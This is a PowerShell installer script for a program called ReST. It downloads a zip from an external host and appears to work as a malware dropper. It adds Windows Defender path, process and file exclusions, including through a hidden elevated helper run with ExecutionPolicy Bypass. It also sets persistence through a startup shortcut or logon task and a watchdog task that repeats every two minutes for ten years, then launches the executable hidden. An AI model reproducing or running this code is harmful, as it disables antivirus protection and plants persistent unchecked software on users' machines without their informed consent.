# ReST remote install - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}

$Dir = Join-Path $env:LOCALAPPDATA "ReST"
$Exe = Join-Path $Dir "ReST.exe"
$TempZip = Join-Path $env:TEMP "ReST-download.zip"
$LogFile = Join-Path $env:TEMP "ReST-install.log"
$script:HadError = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    Write-Host $Text -ForegroundColor Red
    try {
        $ws = New-Object -ComObject WScript.Shell
        $null = $ws.Popup($Text + "`nLog:`n" + $LogFile, 0, "ReST Install", 48)
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host "Press Enter to close"
        Read-Host | Out-Null
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL --retry 2 --retry-delay 1 -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
    }

    $iwrArgs = @{
        Uri = $Url
        OutFile = $OutFile
        UseBasicParsing = $true
    }
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $iwrArgs.UserAgent = "ReST-Installer/1.0"
    }
    Invoke-WebRequest @iwrArgs
}

function Extract-ReSTZip {
    param(
        [string]$ZipFile,
        [string]$OutExe
    )

    $stage = Join-Path $env:TEMP ("ReST-stage-" + [Guid]::NewGuid().ToString("N"))
    New-Item -ItemType Directory -Force -Path $stage | Out-Null
    try {
        $extracted = $null
        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
            [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $stage)
            $extracted = Join-Path $stage "ReST.exe"
        } catch {
            $null = $_
        }

        if (-not ($extracted -and (Test-Path -LiteralPath $extracted))) {
            $tar = Join-Path $env:SystemRoot "System32\tar.exe"
            if (Test-Path -LiteralPath $tar) {
                & $tar -xf $ZipFile -C $stage
                $extracted = Join-Path $stage "ReST.exe"
            }
        }

        if (-not ($extracted -and (Test-Path -LiteralPath $extracted))) {
            Expand-Archive -LiteralPath $ZipFile -DestinationPath $stage -Force
            $extracted = Join-Path $stage "ReST.exe"
        }

        if (-not (Test-Path -LiteralPath $extracted)) {
            throw "ReST.exe missing in zip"
        }

        $moved = $false
        for ($try = 0; $try -lt 5; $try++) {
            Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
            try {
                if (Test-Path -LiteralPath $OutExe) {
                    Remove-Item -LiteralPath $OutExe -Force -ErrorAction Stop
                }
                Move-Item -LiteralPath $extracted -Destination $OutExe -Force -ErrorAction Stop
                $moved = $true
                break
            } catch {
                if ($try -eq 4) {
                    throw
                }
            }
        }
        if (-not $moved) {
            throw "could not replace ReST.exe"
        }
    } finally {
        Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($id)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Add-DefenderExclusionOnce {
    param(
        [string]$Path,
        [string]$ExePath
    )

    $ok = $false
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-InstallLog ("defender path exclusion ok: " + $Path)
        $ok = $true
    } catch {
        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
    }

    try {
        Add-MpPreference -ExclusionProcess "ReST.exe" -ErrorAction Stop
        Write-InstallLog "defender process exclusion ok: ReST.exe"
        $ok = $true
    } catch {
        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
    }

    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
        try {
            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
            $ok = $true
        } catch {
            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
        }
    }

    return $ok
}

function Add-DefenderExclusion {
    param(
        [string]$Path,
        [string]$ExePath
    )

    if (Add-DefenderExclusionOnce -Path $Path -ExePath $ExePath) {
        return $true
    }
    if (Test-IsAdmin) {
        return $false
    }

    Write-InstallLog "defender exclusion needs admin, requesting elevation"
    $helper = Join-Path $env:TEMP "ReST-defender.ps1"
    $result = Join-Path $env:TEMP "ReST-defender.result"
    Remove-Item -LiteralPath $result -Force -ErrorAction SilentlyContinue
    $safePath = $Path.Replace("'", "''")
    $safeExe = ""
    if ($ExePath) {
        $safeExe = $ExePath.Replace("'", "''")
    }
    $safeResult = $result.Replace("'", "''")
    $lines = @(
        "`$ErrorActionPreference = 'Continue'",
        "`$ok = `$false",
        "try { Add-MpPreference -ExclusionPath '$safePath' -ErrorAction Stop; `$ok = `$true } catch {}",
        "try { Add-MpPreference -ExclusionProcess 'ReST.exe' -ErrorAction Stop; `$ok = `$true } catch {}"
    )
    if ($safeExe) {
        $lines += "try { Add-MpPreference -ExclusionPath '$safeExe' -ErrorAction Stop; `$ok = `$true } catch {}"
    }
    $lines += "if (`$ok) { Set-Content -LiteralPath '$safeResult' -Value 'ok' -Encoding ASCII; exit 0 }"
    $lines += "Set-Content -LiteralPath '$safeResult' -Value 'fail' -Encoding ASCII"
    $lines += "exit 1"
    [IO.File]::WriteAllText($helper, ($lines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
    try {
        $arg = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$helper`""
        $shell = New-Object -ComObject Shell.Application
        $shell.ShellExecute("powershell.exe", $arg, "", "runas", 0)
        $deadline = (Get-Date).AddSeconds(90)
        while (-not (Test-Path -LiteralPath $result) -and (Get-Date) -lt $deadline) {
            Start-Sleep -Milliseconds 400
        }
        if ((Test-Path -LiteralPath $result) -and ((Get-Content -LiteralPath $result -Raw).Trim() -eq "ok")) {
            Write-InstallLog "defender exclusion ok via elevation"
            return $true
        }
        Write-InstallLog "defender elevation was not confirmed"
    } catch {
        Write-InstallLog ("defender elevation skipped: " + $_.Exception.Message)
    } finally {
        Remove-Item -LiteralPath $helper -Force -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath $result -Force -ErrorAction SilentlyContinue
    }
    return $false
}

function Complete-DownloadPhase {
    Write-InstallLog "download complete"
    Write-InstallLog "background install start"
}

function Register-WatchdogTask {
    param(
        [string]$TaskName,
        [string]$Exe,
        [string]$Dir
    )

    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.ps1") -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.vbs") -Force -ErrorAction SilentlyContinue

    $Action = New-ScheduledTaskAction -Execute $Exe -Argument "-watchdog" -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
}

function Remove-ReSTStartupTask {
    try {
        Unregister-ScheduledTask -TaskName "ReST" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    } catch {
        $null = $_
    }
}

function Remove-ReSTStartupShortcut {
    try {
        $lnk = Join-Path ([Environment]::GetFolderPath("Startup")) "ReST.lnk"
        if (Test-Path -LiteralPath $lnk) {
            Remove-Item -LiteralPath $lnk -Force -ErrorAction SilentlyContinue
        }
    } catch {
        $null = $_
    }
}

Write-InstallLog "install start"
Write-InstallLog ("target: " + $Exe)

try {
    try {
        New-Item -ItemType Directory -Force -Path $Dir | Out-Null
    } catch {
        $null = $_
    }

    Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 200

    $Url = $BaseUrl + "/ReST.zip"
    Write-InstallLog ("download: " + $Url)

    if (Test-Path -LiteralPath $TempZip) {
        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
    }

    try {
        Download-File -Url $Url -OutFile $TempZip
    } catch {
        Fail-Install ("download failed: " + $_.Exception.Message)
        exit 1
    }

    if (-not (Test-Path -LiteralPath $TempZip)) {
        Fail-Install "missing file after download"
        exit 1
    }

    $length = (Get-Item -LiteralPath $TempZip).Length
    if ($length -lt 524288) {
        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
        Fail-Install ("file too small: " + $length + " bytes")
        exit 1
    }

    Complete-DownloadPhase

    try {
        Extract-ReSTZip -ZipFile $TempZip -OutExe $Exe
    } catch {
        Fail-Install ("extract failed: " + $_.Exception.Message)
        exit 1
    } finally {
        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
    }

    if (-not (Test-Path -LiteralPath $Exe)) {
        Fail-Install "ReST.exe missing after extract"
        exit 1
    }

    Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
    Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

    $startupOk = $false
    try {
        $Startup = [Environment]::GetFolderPath("Startup")
        $Wsh = New-Object -ComObject WScript.Shell
        $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReST.lnk"))
        $Link.TargetPath = $Exe
        $Link.WorkingDirectory = $Dir
        $Link.WindowStyle = 7
        $Link.Save()
        Remove-ReSTStartupTask
        $startupOk = $true
        Write-InstallLog "startup shortcut ok"
    } catch {
        $null = $_
    }

    if (-not $startupOk) {
        Remove-ReSTStartupShortcut
        $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
        Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
        Write-InstallLog "scheduled task ok"
    }

    try {
        Register-WatchdogTask -TaskName "ReST-Watchdog" -Exe $Exe -Dir $Dir
        Write-InstallLog "watchdog task ok"
    } catch {
        Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
    }

    try {
        Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
        Write-InstallLog "started"
    } catch {
        Fail-Install ("start failed: " + $_.Exception.Message)
        exit 1
    }

    Write-InstallLog "install complete"
    Write-Host "ReST install complete." -ForegroundColor Green
    if (-not $Silent) {
        Write-Host "Press Enter to close"
        Read-Host | Out-Null
    }

    exit 0
} catch {
    Fail-Install ("install failed: " + $_.Exception.Message)
    exit 1
}
